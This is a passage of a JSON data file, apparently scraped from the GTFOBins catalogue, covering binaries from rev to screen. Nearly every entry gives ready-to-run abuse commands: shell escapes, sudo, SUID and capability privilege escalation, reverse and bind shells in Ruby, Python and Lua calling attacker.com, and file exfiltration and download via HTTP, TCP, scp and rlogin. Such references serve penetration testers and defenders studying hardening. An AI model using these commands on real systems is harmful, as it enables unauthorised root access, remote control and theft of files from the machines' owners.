        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo rev $LFILE | rev"
      }
    ]
  },
  {
    "id": 225,
    "bin": "rlogin",
    "url": "/gtfobins/rlogin/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend contents of a file to a TCP port. Run nc -l -p 12345 > \"file_to_save\" on the attacker system to capture the contents.\nrlogin hangs waiting for the remote peer to close the socket.\nThe file is corrupted by leading and trailing spurious data.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST"
      }
    ]
  },
  {
    "id": 226,
    "bin": "rlwrap",
    "url": "/gtfobins/rlwrap/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrlwrap /bin/sh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThis adds timestamps to the output file. This relies on the external echo command.\nLFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rlwrap) .\n\n./rlwrap -H /dev/null /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo rlwrap /bin/sh"
      }
    ]
  },
  {
    "id": 227,
    "bin": "rpm",
    "url": "/gtfobins/rpm/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrpm --eval '%{lua:os.execute(\"/bin/sh\")}'\n\n\nrpm --pipe '/bin/sh 0<&1'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'\n\n\nIt runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\nsudo rpm -ivh x-1.0-1.noarch.rpm\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rpm) .\n\n./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
      }
    ]
  },
  {
    "id": 228,
    "bin": "rpmdb",
    "url": "/gtfobins/rpmdb/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrpmdb --eval '%(/bin/sh 1>&2)'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo rpmdb --eval '%(/bin/sh 1>&2)'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rpmdb) .\n\n./rpmdb --eval '%(/bin/sh 1>&2)'"
      }
    ]
  },
  {
    "id": 229,
    "bin": "rpmquery",
    "url": "/gtfobins/rpmquery/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rpmquery) .\n\n./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"
      }
    ]
  },
  {
    "id": 230,
    "bin": "rpmverify",
    "url": "/gtfobins/rpmverify/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrpmverify --eval '%(/bin/sh 1>&2)'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo rpmverify --eval '%(/bin/sh 1>&2)'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rpmverify) .\n\n./rpmverify --eval '%(/bin/sh 1>&2)'"
      }
    ]
  },
  {
    "id": 231,
    "bin": "rsync",
    "url": "/gtfobins/rsync/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rsync) .\n\n./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
      }
    ]
  },
  {
    "id": 232,
    "bin": "ruby",
    "url": "/gtfobins/ruby/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nruby -e 'exec \"/bin/sh\"'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nServe files in the local folder running an HTTP server. This requires version 1.9.2 or later.\nexport LPORT=8888\nruby -run -e httpd . -p $LPORT\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nruby -e 'puts File.read(\"file_to_read\")'\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ruby -e 'exec \"/bin/sh\"'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\ncp $(which ruby) .\nsudo setcap cap_setuid+ep ruby\n\n./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
      }
    ]
  },
  {
    "id": 233,
    "bin": "run-mailcap",
    "url": "/gtfobins/run-mailcap/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nrun-mailcap --action=view /etc/hosts\n!/bin/sh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe file must exist and be not empty.\nThis invokes the default editor, which is likely to be vi, other functions may apply.\nrun-mailcap --action=edit file_to_read\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nrun-mailcap --action=view file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo run-mailcap --action=view /etc/hosts\n!/bin/sh"
      }
    ]
  },
  {
    "id": 234,
    "bin": "run-parts",
    "url": "/gtfobins/run-parts/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrun-parts --new-session --regex '^sh$' /bin\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which run-parts) .\n\n./run-parts --new-session --regex '^sh$' /bin --arg='-p'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo run-parts --new-session --regex '^sh$' /bin"
      }
    ]
  },
  {
    "id": 235,
    "bin": "rview",
    "url": "/gtfobins/rview/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3.\nrview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that rview is compiled with Lua support.\nrview -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nrview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This requires that rview is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nrview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell. This requires that rview is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3. Send local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.\nexport LPORT=8888\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that rview is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that rview is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nexport LFILE=file_to_save\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nrview file_to_write\niDATA\n^[\nw!\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nrview file_to_read\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3.\nrview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3.\nsudo install -m =xs $(which rview) .\n\n./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3.\nsudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that rview is compiled with Lua support.\nsudo rview -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\nThis requires that rview is compiled with Python support. Prepend :py3 for Python 3.\ncp $(which rview) .\nsudo setcap cap_setuid+ep rview\n\n./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that rview is compiled with Lua support.\nsudo install -m =xs $(which rview) .\n\n./rview -c ':lua os.execute(\"reset; exec sh\")'"
      }
    ]
  },
  {
    "id": 236,
    "bin": "rvim",
    "url": "/gtfobins/rvim/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3.\nrvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that rvim is compiled with Lua support.\nrvim -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This requires that rvim is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell. This requires that rvim is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Send local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.\nexport LPORT=8888\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that rvim is compiled with Lua support and that lua-socket is installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that rvim is compiled with Lua support and that lua-socket is installed.\nexport LPORT=12345\nexport LFILE=file_to_save\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nrvim file_to_write\niDATA\n^[\nw\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nrvim file_to_read\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3.\nrvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3.\nsudo install -m =xs $(which rvim) .\n\n./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3.\nsudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n\nThis requires that rvim is compiled with Lua support.\nsudo rvim -c ':lua os.execute(\"reset; exec sh\")'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\nThis requires that rvim is compiled with Python support. Prepend :py3 for Python 3.\ncp $(which rvim) .\nsudo setcap cap_setuid+ep rvim\n\n./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis requires that rvim is compiled with Lua support.\nsudo install -m =xs $(which rvim) .\n\n./rvim -c ':lua os.execute(\"reset; exec sh\")'"
      }
    ]
  },
  {
    "id": 237,
    "bin": "sash",
    "url": "/gtfobins/sash/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nsash\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which sash) .\n\n./sash\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo sash"
      }
    ]
  },
  {
    "id": 238,
    "bin": "scanmem",
    "url": "/gtfobins/scanmem/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nscanmem\nshell /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which scanmem) .\n\n./scanmem\nshell /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo scanmem\nshell /bin/sh"
      }
    ]
  },
  {
    "id": 239,
    "bin": "scp",
    "url": "/gtfobins/scp/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file to a SSH server.\nRPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file from a SSH server.\nRPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which scp) .\n\nTF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:"
      }
    ]
  },
  {
    "id": 240,
    "bin": "screen",
    "url": "/gtfobins/screen/",
    "funcs": [
      {
        "func": "Shell",
